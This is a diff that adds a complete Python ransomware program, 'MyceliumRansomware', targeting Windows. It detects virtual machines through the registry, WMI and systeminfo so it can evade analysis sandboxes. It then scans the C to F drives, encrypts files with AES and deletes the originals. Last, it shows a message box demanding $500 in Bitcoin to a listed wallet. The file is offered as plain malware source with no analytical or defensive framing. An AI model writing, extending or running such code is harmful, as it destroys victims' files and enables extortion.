@@ -1,0 +1,153 @@
+import os
+import sys
+import time
+import threading
+import ctypes
+import subprocess
+from pathlib import Path
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
+import winreg as reg
+import wmi
+
+# --- CONFIGURATION ---
+EXTENSION = ".myco"
+KEY_FILE = "myco_key.key"
+PAYMENT_TIME_MINUTES = 60
+
+class MyceliumRansomware:
+    def __init__(self):
+        self.files_encrypted = []
+        self.lock = threading.Lock()
+        
+        # Generate or Load Key
+        if os.path.exists(KEY_FILE):
+            with open(KEY_FILE, 'rb') as f:
+                self.key = f.read()
+        else:
+            self.key = get_random_bytes(16)
+            with open(KEY_FILE, 'wb') as f:
+                f.write(self.key)
+
+    def check_vm(self):
+        """Checks if running inside a Virtual Machine."""
+        try:
+            # Check Registry for VMware/VirtualBox signatures
+            hklm = reg.HKEY_LOCAL_MACHINE
+            subkey = r"SYSTEM\CurrentControlSet\Services\Disk\Enum"
+            try:
+                val = reg.QueryValueEx(hklm, subkey)[0]
+                if "VMware" in val or "VirtualBox" in val:
+                    return True
+            except FileNotFoundError:
+                pass
+            
+            # Check WMI for Hyper-V or VM names
+            c = wmi.WMI()
+            for computer_system in c.Win32_ComputerSystem():
+                if "VMware" in computer_system.Manufacturer or \
+                   "VirtualBox" in computer_system.Manufacturer or \
+                   "Virtual" in computer_system.Model:
+                    return True
+            
+            # Check for Hypervisor present flag
+            cpuinfo = subprocess.check_output(['systeminfo']).decode('utf-8')
+            if "Hyper-V" in cpuinfo or "VMware" in cpuinfo:
+                return True
+                
+        except Exception:
+            pass
+        
+        return False
+
+    def encrypt_file(self, filepath):
+        """Encrypts a single file using AES in CBC mode."""
+        try:
+            with open(filepath, 'rb') as f:
+                data = f.read()
+            
+            iv = get_random_bytes(16)
+            cipher = AES.new(self.key, AES.MODE_CBC, iv)
+            encrypted_data = cipher.encrypt(pad(data, AES.block_size))
+            
+            new_path = str(filepath) + EXTENSION
+            with open(new_path, 'wb') as f:
+                f.write(iv + encrypted_data)
+            
+            os.remove(filepath)
+            
+            with self.lock:
+                self.files_encrypted.append(new_path)
+                
+        except Exception:
+            pass
+
+    def scan_drives(self):
+        """Scans all available fixed drives for files."""
+        drives = []
+        for drive in ['C', 'D', 'E', 'F']:
+            if os.path.exists(f"{drive}:\\"):
+                drives.append(f"{drive}\\")
+        
+        for drive in drives:
+            print(f"[MYCO] Scanning {drive}...")
+            for root, dirs, files in os.walk(drive):
+                # Skip system folders to prevent OS crash
+                if any(skip in root.lower() for skip in ['windows', 'program files', '.myco']):
+                    continue
+                    
+                for filename in files:
+                    if not filename.endswith(EXTENSION) and not filename == KEY_FILE:
+                        filepath = os.path.join(root, filename)
+                        self.encrypt_file(filepath)
+
+    def show_ransom_popup(self):
+        """Displays a WannaCry-style popup."""
+        while True:
+            # Countdown logic
+            remaining_seconds = PAYMENT_TIME_MINUTES * 60
+            
+            # Create the window title dynamically
+            title = f"YOUR FILES ARE ENCRYPTED\nTime Remaining: {remaining_seconds // 60}:{(remaining_seconds % 60):02d}"
+            
+            # Use ctypes to call Windows MessageBox API
+            # MB_ICONWARNING | MB_OKCANCEL | MB_TOPMOST
+            result = ctypes.windll.user32.MessageBoxW(
+                0, 
+                "All your files are encrypted. To decrypt them, send $500 worth of Bitcoin to the address below.\n\nWallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nYou have 60 minutes before the price doubles.", 
+                title, 
+                0x30 | 0x1000  # Icon Warning + Topmost
+            )
+            
+            if result == 1: # OK clicked
+                break
+            elif result == 2: # Cancel clicked
+                break
+            
+            # Update the text slightly or just loop
+            time.sleep(1)
+
+    def run(self):
+        if self.check_vm():
+            print("[MYCO] VM Detected. Exiting safely.")
+            sys.exit(0)
+            
+        print("[MYCO] Initializing Mycelium Strain...")
+        print("[MYCO] Environment: Physical Host")
+        
+        # Start Encryption Thread
+        enc_thread = threading.Thread(target=self.scan_drives, daemon=True)
+        enc_thread.start()
+        
+        # Wait for encryption to finish (or run parallel)
+        enc_thread.join()
+        
+        print(f"[MYCO] Encrypted {len(self.files_encrypted)} files.")
+        
+        # Show Popup
+        self.show_ransom_popup()
+
+if __name__ == "__main__":
+    ransomware = MyceliumRansomware()
+    ransomware.run()
